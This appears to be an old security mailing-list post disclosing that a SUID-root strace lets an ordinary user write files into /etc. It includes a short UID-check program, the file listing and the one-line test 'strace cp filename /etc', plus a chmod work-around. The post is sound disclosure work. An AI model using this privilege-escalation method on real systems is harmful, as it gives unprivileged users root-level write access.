Hello security gurus,
This may not be a kernel issue, but `strace` interacts with it so
here is the frightening thing:
It is possible for an ordinary user to use `strace` (which by default
runs SUID-root), to copy a password file to /etc.
Watch!

Note that geteuid() returned 0;
Also:
main()
{
   printf("UID = %d, GID = %d, EUID = %d\n", getuid(), getgid(), geteuid());
}
UID = 100, GID = 100, EUID = 100
This is my real UID, etc.
The temporary work-around is to unset the SUID bit in `strace`. The
base distribution on this system was RedHat in 1996 (old). Maybe
newer distributions have fixed this.
-rwsr-xr-x   1 root   root        85397 Feb 26  1996 /usr/local/bin/strace
To see if you have this bug, log onto a user account, create some
file, and attempt to `strace cp filename /etc`. If it goes, become
root and do chmod 755 `which strace`.
